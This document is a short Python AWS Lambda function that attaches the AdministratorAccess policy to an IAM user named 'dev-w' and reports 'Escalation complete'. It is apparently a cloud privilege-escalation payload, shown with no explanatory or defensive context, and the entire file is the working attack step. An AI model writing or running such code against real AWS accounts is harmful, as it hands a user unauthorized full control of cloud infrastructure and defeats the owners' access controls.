import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    # Attach AdministratorAccess directly to dev-w
    iam.attach_user_policy(
        UserName='dev-w',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {
        'statusCode': 200,
        'body': 'Escalation complete — dev-w now has AdministratorAccess'
    }